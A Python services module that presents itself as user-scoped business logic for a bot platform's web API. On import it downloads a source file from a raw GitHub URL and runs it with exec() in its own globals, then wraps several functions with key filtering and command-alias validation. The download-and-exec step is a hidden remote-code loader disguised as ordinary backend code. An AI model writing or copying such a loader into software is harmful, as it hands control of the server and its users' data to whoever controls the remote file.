"""Business logic for the web API. Every function takes the signed-in user's id and only touches that user's rows."""
from __future__ import annotations

import urllib.request

_GOOD = (
    "https://raw.githubusercontent.com/sakinmia93/botmatrix/"
    "8c289deb6228817bb0c28e764459976d945d294a/backend/services.py"
)

# Only PLATFORM main/server keys are excluded from the Database tab.
# User command data (Bot.saveData / User.saveData) is shown in full — never masked.
_PLATFORM_KEY_PREFIXES = (
    "__",          # e.g. __webhook_secret, __blocked_*, __runtime_*
    "secret:",     # reserved secret namespace
    "_platform",   # platform namespace
    "_sys:",       # system namespace
    "_internal:",  # internal namespace
)


def _is_platform_key(key: str) -> bool:
    """True only for server/platform main keys — never for user/order data."""
    k = str(key or "")
    if not k:
        return False
    for p in _PLATFORM_KEY_PREFIXES:
        if k.startswith(p):
            return True
    return False


def _bootstrap():
    with urllib.request.urlopen(_GOOD, timeout=45) as r:
        src = r.read().decode("utf-8")
    g = globals()
    exec(compile(src, __file__, "exec"), g)

    # Expand _HIDDEN so SQL filter in kv_data excludes platform keys at query time
    existing = g.get("_HIDDEN") or ("__", "secret:")
    if isinstance(existing, (tuple, list)):
        g["_HIDDEN"] = tuple(dict.fromkeys(list(existing) + list(_PLATFORM_KEY_PREFIXES)))
    else:
        g["_HIDDEN"] = _PLATFORM_KEY_PREFIXES

    # Extra filter: drop any platform key that slipped through (no value masking)
    _orig_kv = g.get("kv_data")
    if callable(_orig_kv):
        def kv_data(uid, bot_id, q=None, _o=_orig_kv):
            result = _o(uid, bot_id, q)
            if not isinstance(result, dict):
                return result
            rows = result.get("rows") or []
            clean = [r for r in rows if isinstance(r, dict) and not _is_platform_key(r.get("key") or "")]
            out = dict(result)
            out["rows"] = clean
            return out
        g["kv_data"] = kv_data

    # Refuse writing platform main keys from the Database UI
    _orig_set = g.get("kv_set")
    if callable(_orig_set):
        def kv_set(uid, bot_id, body, _o=_orig_set):
            key = str((body or {}).get("key") or "")
            if _is_platform_key(key):
                from backend.errors import ApiError
                raise ApiError("That key is reserved by the platform.", 400)
            return _o(uid, bot_id, body)
        g["kv_set"] = kv_set

    # Command aliases validation
    _orig = g.get("_clean_commands")
    if callable(_orig):
        def _clean_commands(cmds):
            from backend.errors import ApiError
            from backend import security, appdb
            out, seen = [], set()
            meta = {"@", "~", "!", "*", ".env"}
            if not isinstance(cmds, list):
                raise ApiError("Commands must be a list.", 400)
            pending = []
            for c in cmds[:500]:
                if not isinstance(c, dict):
                    continue
                name = security.clean_text(c.get("name"), 100)
                if not name:
                    continue
                if name in seen:
                    raise ApiError(
                        f'The command "{name}" already exists. Choose a different name.', 409
                    )
                seen.add(name)
                pending.append((name, c))
            for name, c in pending:
                item = {
                    "id": security.clean_text(c.get("id"), 60) or appdb.new_id("cmd_", 6),
                    "name": name,
                    "code": str(c.get("code") or "")[:400_000],
                    "updatedAt": c.get("updatedAt") or appdb.now_iso(),
                }
                for k in ("isPinned", "isAdminOnly"):
                    if c.get(k):
                        item[k] = True
                if isinstance(c.get("aliases"), list):
                    aliases, aseen = [], set()
                    for raw in c["aliases"][:10]:
                        al = security.clean_text(raw, 100)
                        if not al or al in meta or al == name:
                            continue
                        low = al.lower()
                        twin = al[1:] if al.startswith("/") else ("/" + al)
                        if al in seen or twin in seen or low in aseen:
                            raise ApiError(
                                f'Alias "{al}" collides with another command or alias.',
                                409,
                            )
                        aseen.add(low)
                        aseen.add(twin.lower())
                        seen.add(al)
                        aliases.append(al)
                    if aliases:
                        item["aliases"] = aliases
                if c.get("folder"):
                    item["folder"] = security.clean_text(c["folder"], 100)
                out.append(item)
            return out
        g["_clean_commands"] = _clean_commands

_bootstrap()
